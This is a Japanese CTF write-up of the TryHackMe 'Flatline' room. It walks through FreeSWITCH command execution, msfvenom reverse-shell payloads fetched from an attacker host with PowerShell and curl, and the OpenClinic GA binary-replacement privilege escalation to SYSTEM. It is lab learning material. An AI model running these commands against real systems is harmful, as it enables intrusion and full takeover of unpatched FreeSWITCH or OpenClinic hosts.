# Flatline CTF

https://tryhackme.com/room/flatline

## Enumeration

### ポートスキャン

```shell
TARGET=10.10.5.121

root@ip-10-10-80-230:~# sudo nmap -sS -p- $TARGET
Starting Nmap 7.80 ( https://nmap.org ) at 2025-02-20 06:24 GMT
Nmap scan report for 10.10.5.121
Host is up (0.0063s latency).
Not shown: 65533 filtered ports
PORT     STATE SERVICE
3389/tcp open  ms-wbt-server
8021/tcp open  ftp-proxy
MAC Address: 02:EF:99:CF:37:73 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 104.50 seconds
root@ip-10-10-80-230:~# sudo nmap -sV -p3389,8021 $TARGET
Starting Nmap 7.80 ( https://nmap.org ) at 2025-02-20 06:31 GMT
Nmap scan report for 10.10.5.121
Host is up (0.00020s latency).

PORT     STATE SERVICE          VERSION
3389/tcp open  ms-wbt-server    Microsoft Terminal Services
8021/tcp open  freeswitch-event FreeSWITCH mod_event_socket
MAC Address: 02:EF:99:CF:37:73 (Unknown)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.92 seconds
```

## FreeSWITCH

```shell
$ searchsploit Freeswitch
---------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                    |  Path
---------------------------------------------------------------------------------- ---------------------------------
FreeSWITCH - Event Socket Command Execution (Metasploit)                          | multiple/remote/47698.rb
FreeSWITCH 1.10.1 - Command Execution                                             | windows/remote/47799.txt
---------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

metasploit を実行してみたが失敗。

```shell
msf6 exploit(multi/misc/freeswitch_event_socket_cmd_exec) > set RHOSTS 10.10.5.121
RHOSTS => 10.10.5.121
msf6 exploit(multi/misc/freeswitch_event_socket_cmd_exec) > set LHOST 10.2.22.182
LHOST => 10.2.22.182
msf6 exploit(multi/misc/freeswitch_event_socket_cmd_exec) > run

[*] Started reverse TCP double handler on 10.2.22.182:4444
[*] 10.10.5.121:8021 - Login success
[*] 10.10.5.121:8021 - Sending payload (300 bytes) ...
[*] Exploit completed, but no session was created.
```

windows/remote/47799.txt のスクリプトでコマンド実行できた。

```shell
$ python ./poc.py 10.10.5.121 whoami
Authenticated
Content-Type: api/response
Content-Length: 25

win-eom4pk0578n\nekrotic
```

systeminfo

```shell
$ python ./poc.py 10.10.5.121 systeminfo
Authenticated
Content-Type: api/response
Content-Length: 2185


Host Name:                 WIN-EOM4PK0578N
OS Name:                   Microsoft Windows Server 2019 Standard Evaluation
OS Version:                10.0.17763 N/A Build 17763
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:
Product ID:                00431-10000-00000-AA066
Original Install Date:     09/11/2021, 07:13:22
System Boot Time:          20/02/2025, 06:14:14
System Manufacturer:       Xen
System Model:              HVM domU
System Type:               x64-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: Intel64 Family 6 Model 79 Stepping 1 GenuineIntel ~2300 Mhz
BIOS Version:              Xen 4.11.amazon, 24/08/2006
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             en-gb;English (United Kingdom)
Input Locale:              en-gb;English (United Kingdom)
Time Zone:                 (UTC+00:00) Dublin, Edinburgh, Lisbon, London
Total Physical Memory:     4,096 MB
Available Physical Memory: 2,627 MB
Virtual Memory: Max Size:  5,504 MB
Virtual Memory: Available: 3,560 MB
Virtual Memory: In Use:    1,944 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    WORKGROUP
Logon Server:              N/A
Hotfix(s):                 3 Hotfix(s) Installed.
                           [01]: KB4514366
                           [02]: KB4512577
                           [03]: KB4512578
Network Card(s):           1 NIC(s) Installed.
                           [01]: AWS PV Network Device
                                 Connection Name: Ethernet
                                 DHCP Enabled:    Yes
                                 DHCP Server:     10.10.0.1
                                 IP address(es)
                                 [01]: 10.10.5.121
                                 [02]: fe80::c410:34f2:4a2c:c5d1
Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.
```

```shell
$ python ./poc.py 10.10.5.121 'dir c:\Users'
Authenticated
Content-Type: api/response
Content-Length: 405

 Volume in drive C has no label.
 Volume Serial Number is 84FD-2CC9

 Directory of c:\Users

09/11/2021  07:28    <DIR>          .
09/11/2021  07:28    <DIR>          ..
09/11/2021  07:13    <DIR>          Administrator
09/11/2021  07:37    <DIR>          Nekrotic
09/11/2021  07:13    <DIR>          Public
               0 File(s)              0 bytes
               5 Dir(s)  50,218,041,344 bytes free
```

```shell
$ python ./poc.py 10.10.5.121 'dir c:\Users\Nekrotic\Desktop'
Authenticated
Content-Type: api/response
Content-Length: 374

 Volume in drive C has no label.
 Volume Serial Number is 84FD-2CC9

 Directory of c:\Users\Nekrotic\Desktop

09/11/2021  07:39    <DIR>          .
09/11/2021  07:39    <DIR>          ..
09/11/2021  07:39                38 root.txt
09/11/2021  07:39                38 user.txt
               2 File(s)             76 bytes
               2 Dir(s)  50,222,215,168 bytes free
```

```shell
$ python ./poc.py 10.10.5.121 'type c:\Users\Nekrotic\Desktop\user.txt'
Authenticated
Content-Type: api/response
Content-Length: 38

THM{64............}
```

ユーザーフラグゲット

## 権限昇格

シェルの取得を目指す。

リバースシェルの作成とアップロード

```shell
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.2.22.182 LPORT=8888 -f exe -o sec.exe

$ python ./poc.py 10.10.148.116 'powershell -c "Invoke-WebRequest -uri http://10.2.22.182:8000/sec.exe -outfile C:\Users\public\sec.exe"'
Authenticated
Content-Type: api/response
Content-Length: 14

$ python ./poc.py 10.10.148.116 'dir c:\Users\public'
Authenticated
Content-Type: api/response
Content-Length: 540

 Volume in drive C has no label.
 Volume Serial Number is 84FD-2CC9

 Directory of c:\Users\public

20/02/2025  07:31    <DIR>          .
20/02/2025  07:31    <DIR>          ..
09/11/2021  02:12    <DIR>          Documents
15/09/2018  07:19    <DIR>          Downloads
15/09/2018  07:19    <DIR>          Music
15/09/2018  07:19    <DIR>          Pictures
20/02/2025  07:31            73,802 sec.exe
15/09/2018  07:19    <DIR>          Videos
               1 File(s)         73,802 bytes
               7 Dir(s)  50,158,673,920 bytes free
```

```shell
$ python ./poc.py 10.10.148.116 'C:\Users\public\sec.exe'

$ msfconsole -q -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST 10.2.22.182; set LPORT 8888;exploit"
[*] Using configured payload generic/shell_reverse_tcp
payload => windows/meterpreter/reverse_tcp
LHOST => 10.2.22.182
LPORT => 8888
[*] Started reverse TCP handler on 10.2.22.182:8888
[*] Sending stage (176198 bytes) to 10.10.148.116
[*] Meterpreter session 1 opened (10.2.22.182:8888 -> 10.10.148.116:49766) at 2025-02-20 02:36:10 -0500

meterpreter >
```

meterpreter 取得成功

3 つの権限が有効になっている。

```shell
SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
SeCreateGlobalPrivilege                   Create global objects                                              Enabled
```

https://github.com/gtworek/Priv2Admin に載っている権限ではない。  
SeImpersonatePrivilege で、WinRM サービスが何らかの理由で起動していなければ、RogueWinRM を利用する権限昇格の可能性があったが、起動しているので使えない。

```shell
C:\>net start
net start
These Windows services are started:

   Windows Remote Management (WS-Management)

```

### projects\openclinic フォルダ

```shell
C:\projects\openclinic>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 84FD-2CC9

 Directory of C:\projects\openclinic

09/11/2021  07:29    <DIR>          .
09/11/2021  07:29    <DIR>          ..
06/04/2021  22:14               250 configureCountry.bat
01/07/2021  17:20               167 configureLanguage.bat
09/11/2021  07:29    <DIR>          jdk1.8
09/11/2021  07:18           334,840 lua5.1.dll
09/11/2021  07:19    <DIR>          mariadb
07/06/2021  15:58            93,696 OpenClinic GA login.exe
08/05/2020  11:17            27,136 OpenClinicStartServices.exe
01/05/2021  23:45               316 stopOpenClinicHttp.bat
09/11/2021  07:30    <DIR>          tomcat8
09/11/2021  07:29    <DIR>          Uninstall
09/11/2021  07:18         1,389,568 uninstall.exe
               7 File(s)      1,845,973 bytes
               6 Dir(s)  50,243,616,768 bytes free
```

```shell
C:\projects\openclinic>type stopOpenClinicHttp.bat
type stopOpenClinicHttp.bat
@ECHO OFF
taskkill /FI "SERVICES eq OpenClinicHttp" /F
timeout 2
echo Trying to stop OpenClinicHttp service. This may take a while. Please be patient...
:loop
sc query OpenClinicHttp | find "STOPPED"
if errorlevel 1 (
  echo Stop OpenClinicHttp timed out, retrying in 5 seconds...
  timeout 5
  goto loop
)
```

```shell
C:\projects\openclinic>sc qc OpenClinicHttp
sc qc OpenClinicHttp
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: OpenClinicHttp
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : c:\projects\openclinic\tomcat8\bin\tomcat8.exe //RS//OpenClinicHttp
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : OpenClinicHttp
        DEPENDENCIES       : Tcpip
                           : Afd
        SERVICE_START_NAME : NT Authority\LocalService
```

「OpenClinic GA login.exe」の存在があからさまに怪しいと思ったが、サービスとのつながりがよく見えない。「OpenClinic.exe」リバースシェルを作って、サービスを停止、開始してみたが、接続は無かった。  
サービスとしての exe ではなく通常の exe を作っても同じ。

```shell
$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.2.22.182 LPORT=8889 -f exe-service -o OpenClinic.exe
```

```shell
C:\projects\openclinic>stopOpenClinicHttp.bat
stopOpenClinicHttp.bat
SUCCESS: The process with PID 2872 has been terminated.
ERROR: Input redirection is not supported, exiting the process immediately.
Trying to stop OpenClinicHttp service. This may take a while. Please be patient...
Stop OpenClinicHttp timed out, retrying in 5 seconds...
ERROR: Input redirection is not supported, exiting the process immediately.
        STATE              : 1  STOPPED

C:\projects\openclinic>OpenClinicStartServices.exe
OpenClinicStartServices.exe

C:\projects\openclinic>net start OpenClinicHttp
The OpenClinicHttp service is starting..
The OpenClinicHttp service was started successfully
```

### openclinic の脆弱性

```shell
$ searchsploit openclinic
---------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                    |  Path
---------------------------------------------------------------------------------- ---------------------------------
OpenClinic GA 5.194.18 - Local Privilege Escalation                               | windows/local/50448.txt
OpenClinic GA 5.247.01 - Information Disclosure                                   | php/webapps/51994.md
OpenClinic GA 5.247.01 - Path Traversal (Authenticated)                           | php/webapps/51995.md
---------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

ローカル権限昇格の脆弱性の可能性がある。

```text
                                # Proof of Concept

1. Generate malicious .exe on attacking machine
    msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.102 LPORT=4242 -f exe > /var/www/html/mysqld_evil.exe

2. Setup listener and ensure apache is running on attacking machine
    nc -lvp 4242
    service apache2 start

3. Download malicious .exe on victim machine
    type on cmd: curl http://192.168.1.102/mysqld_evil.exe -o "C:\projects\openclinic\mariadb\bin\mysqld_evil.exe"

4. Overwrite file and copy malicious .exe.
    Renename C:\projects\openclinic\mariadb\bin\mysqld.exe > mysqld.bak
    Rename downloaded 'mysqld_evil.exe' file in mysqld.exe

5. Restart victim machine

6. Reverse Shell on attacking machine opens
    C:\Windows\system32>whoami
    whoami
    nt authority\system
```

4 まで指示通りにした後、stopOpenClinicHttp.bat によるサービスリスタートを試みるが接続が無かった。PoC の通り、コンピュータを再起動してみる。

```shell
PS C:\projects\openclinic> Restart-Computer
```

リバースシェルに接続が来た

```shell
C:\Users\Nekrotic\Desktop>whoami
whoami
nt authority\system

C:\Users\Nekrotic\Desktop>type root.txt
type root.txt
THM{8.............}
```

ルートフラグゲット

## 振り返り

- ターゲットマシンを再起動するパターンは初めて。なんとなく、THM 的に Terminate するのと同じではないかと思い込んでいたのでその発想は無かった。
- openclinic が一般的なアプリケーションだとずっと気付かず、脆弱性を検索することもしなかった。名前に open と付いてるのに。鈍い・・・
- とりあえず FreeSWITCH と openclinic というキーワードだけは覚えておきたい。
